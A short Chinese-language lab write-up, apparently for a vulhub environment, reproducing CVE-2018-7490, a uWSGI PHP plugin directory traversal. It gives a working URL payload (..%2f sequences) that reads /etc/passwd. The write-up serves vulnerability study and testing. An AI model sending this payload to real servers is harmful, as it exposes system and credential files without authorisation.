

# uWSGI PHP目录遍历漏洞（CVE-2018-7490）

###### by ADummy

### 0x00利用路线

​			直接url执行

### 0x01漏洞介绍

​			uWSGI是一个Web应用程序服务器，它实现诸如WSGI / uwsgi / http之类的协议，并通过插件支持多种语言。

2.0.17之前的uWSGI的PHP插件无法`DOCUMENT_ROOT`正确检测到，导致无法`DOCUMENT_ROOT`通过使用读取或运行文件`..%2f`。

影响版本

```
uWSGI PHP Plugin  < 2.0.17
```

### 0x 02漏洞复现

访问`http://your-ip:8080`，您将看到phpinfo页面，因为uwsgi-php服务器已成功运行。

![uWSGI_PHP目录遍历漏洞_1](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/uWSGI_PHP目录遍历漏洞_1.jpg)

直接访问`http://your-ip:8080/..%2f..%2f..%2f..%2f..%2fetc/passwd`，您将获得passwd文件

![uWSGI_PHP目录遍历漏洞_1](https://github.com/ADummmy/vulhub_Writeup/blob/main/src/uWSGI_PHP目录遍历漏洞_2.jpg)



